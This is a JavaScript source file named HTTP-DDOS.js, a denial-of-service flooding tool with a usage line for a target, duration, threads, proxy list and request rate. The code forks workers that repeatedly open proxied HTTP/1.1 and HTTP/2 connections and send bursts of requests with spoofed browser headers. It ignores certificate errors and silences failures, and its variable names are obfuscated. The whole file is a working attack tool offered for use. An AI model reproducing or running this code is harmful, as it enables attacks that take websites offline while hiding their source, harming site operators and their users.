/*  
node HTTP-DDOS.js example.com 200 30 proxy.txt 64 POST

npm i cluster tls http2 header-generator
*/

const url = require("url"),
      fs = require("fs"),
      http2 = require("http2"),
      http = require("http"),
      net = require("net"),
      tls = require("tls"),
      cluster = require("cluster"),
      {
  HeaderGenerator
} = require("header-generator"),
      ignoreNames = ["RequestError", "StatusCodeError", "CaptchaError", "CloudflareError", "ParseError", "ParserError"],
      ignoreCodes = ["SELF_SIGNED_CERT_IN_CHAIN", "ECONNRESET", "ERR_ASSERTION", "ECONNREFUSED", "EPIPE", "EHOSTUNREACH", "ETIMEDOUT", "ESOCKETTIMEDOUT", "EPROTO"];

process.on("uncaughtException", function (_0x2c7413) {
  if (_0x2c7413.code && ignoreCodes.includes(_0x2c7413.code) || _0x2c7413.name && ignoreNames.includes(_0x2c7413.name)) return !1;
}).on("unhandledRejection", function (_0x589360) {
  if (_0x589360.code && ignoreCodes.includes(_0x589360.code) || _0x589360.name && ignoreNames.includes(_0x589360.name)) return !1;
}).on("warning", _0x5e7635 => {
  if (_0x5e7635.code && ignoreCodes.includes(_0x5e7635.code) || _0x5e7635.name && ignoreNames.includes(_0x5e7635.name)) return !1;
}).setMaxListeners(0);
let headerGenerator = new HeaderGenerator({
  "browsers": [{
    "name": "chrome",
    "minVersion": 65,
    "httpVersion": "2"
  }, {
    "name": "firefox",
    "minVersion": 80,
    "httpVersion": "2"
  }, {
    "name": "safari",
    "httpVersion": "1"
  }],
  "devices": ["desktop", "mobile"],
  "operatingSystems": ["linux", "windows", "macos", "android", "ios"],
  "locales": ["en-US", "en"]
});
tls.DEFAULT_ECDH_CURVE;
tls.authorized = true;
tls.sync = true;
let target = process.argv[2],
    time = process.argv[3],
    thread = process.argv[4],
    proxys = fs.readFileSync(process.argv[5], "utf-8").toString().match(/\S+/g),
    rps = process.argv[6],
    type = process.argv[7];

function proxyr() {
  return proxys[Math.floor(Math.random() * proxys.length)];
}

if (cluster.isMaster) {
  console.log("Target: " + target + " | Threads: " + thread + " | RPS: " + rps + " | Method: " + type);

  for (var bb = 0; bb < thread; bb++) {
    cluster.fork();
  }

  setTimeout(() => {
    process.exit(-1);
  }, time * 1000);
} else {
  function flood() {
    var _0x4c15ef = url.parse(target);

    var _0x5b4f90 = proxyr().split(":");

    let _0xf0baa1 = headerGenerator.getHeaders();

    var _0x33cfe2 = _0xf0baa1;

    if (_0x4c15ef.protocol == "https:") {
      _0xf0baa1[":path"] = _0x4c15ef.path;
      _0xf0baa1[":method"] = type;
      _0xf0baa1[":scheme"] = _0x4c15ef.protocol.replace(":", "");
      _0xf0baa1[":authority"] = _0x4c15ef.host;
    }

    const _0x454016 = new http.Agent({
      "keepAlive": true,
      "keepAliveMsecs": 50000,
      "maxSockets": Infinity,
      "maxTotalSockets": Infinity,
      "maxSockets": Infinity
    });

    var _0x349a13 = http.request({
      "host": _0x5b4f90[0],
      "agent": _0x454016,
      "globalAgent": _0x454016,
      "port": _0x5b4f90[1],
      "headers": {
        "Host": _0x4c15ef.host,
        "Proxy-Connection": "Keep-Alive",
        "Connection": "Keep-Alive"
      },
      "method": "CONNECT",
      "path": _0x4c15ef.host
    }, function () {
      _0x349a13.setSocketKeepAlive(true);
    });

    const _0x419671 = ["ecdsa_secp256r1_sha256", "ecdsa_secp384r1_sha384", "ecdsa_secp521r1_sha512", "rsa_pss_rsae_sha256", "rsa_pss_rsae_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha256", "rsa_pkcs1_sha384", "rsa_pkcs1_sha512"];

    let _0x2718e1 = _0x419671.join(":");

    const _0x17c898 = new URL(target);

    const _0x52f158 = _0x17c898.port == "" ? _0x4c15ef.protocol == "https" ? 443 : 80 : parseInt(_0x17c898.port);

    _0x349a13.on("connect", function (_0x1d7187, _0x5544d2, _0x9cd38a) {
      if (_0x4c15ef.protocol == "https:") {
        const _0x1e873d = http2.connect(_0x4c15ef.href, {
          "createConnection": () => tls.connect({
            "host": _0x4c15ef.host,
            "ciphers": tls.getCiphers().standardName,
            "secureProtocol": ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"],
            "port": _0x52f158,
            "servername": _0x4c15ef.host,
            "maxRedirects": 20,
            "followAllRedirects": true,
            "secure": true,
            "sigalgs": _0x2718e1,
            "rejectUnauthorized": false,
            "honorCipherOrder": true,
            "ALPNProtocols": ["h2", "http1.1"],
            "sessionTimeout": 5000,
            "socket": _0x5544d2
          }, function () {
            for (let _0x214da4 = 0; _0x214da4 < rps; _0x214da4++) {
              const _0x349a13 = _0x1e873d.request(_0x33cfe2);

              _0x349a13.setEncoding("utf8");

              _0x349a13.on("data", _0x2407a7 => {});

              _0x349a13.on("response", () => {
                _0x349a13.close();
              });

              _0x349a13.end();
            }
          })
        });
      } else {
        let _0x2af756 = type + " " + _0x4c15ef.href + " HTTP/1.1\r\n";

        _0xf0baa1 = {};
        _0xf0baa1.Host = _0x4c15ef.host;
        _0xf0baa1.Connection = "keep-alive";

        for (const _0x33cfe2 in _0xf0baa1) {
          function _0x38b408(_0x567203) {
            const _0x4dba01 = _0x567203.toLowerCase().split("-");

            for (let _0x590501 = 0; _0x590501 < _0x4dba01.length; _0x590501++) {
              _0x4dba01[_0x590501] = _0x4dba01[_0x590501].charAt(0).toUpperCase() + _0x4dba01[_0x590501].substring(1);
            }

            return _0x4dba01.join("-");
          }

          _0x2af756 += _0x38b408(_0x33cfe2) + ": " + _0xf0baa1[_0x33cfe2] + "\r\n";
        }

        _0x2af756 += "\r\n";

        let _0x5544d2 = net.connect(_0x5b4f90[1], _0x5b4f90[0]);

        _0x5544d2.setKeepAlive(true, 5000);

        _0x5544d2.setTimeout(5000);

        _0x5544d2.once("error", _0x23fb88 => {
          _0x5544d2.destroy();
        });

        _0x5544d2.once("disconnect", () => {});

        _0x5544d2.once("data", () => setTimeout(() => _0x5544d2.destroy(), 10000));

        for (let _0x415b3a = 0; _0x415b3a < rps; _0x415b3a++) {
          _0x5544d2.write(Buffer.from(_0x2af756, "binary"));
        }

        _0x5544d2.on("data", function () {
          setTimeout(function () {
            _0x5544d2.destroy();

            return delete _0x5544d2;
          }, 5000);
        });
      }
    });

    _0x349a13.end();
  }

  setInterval(() => {
    flood();
  });
}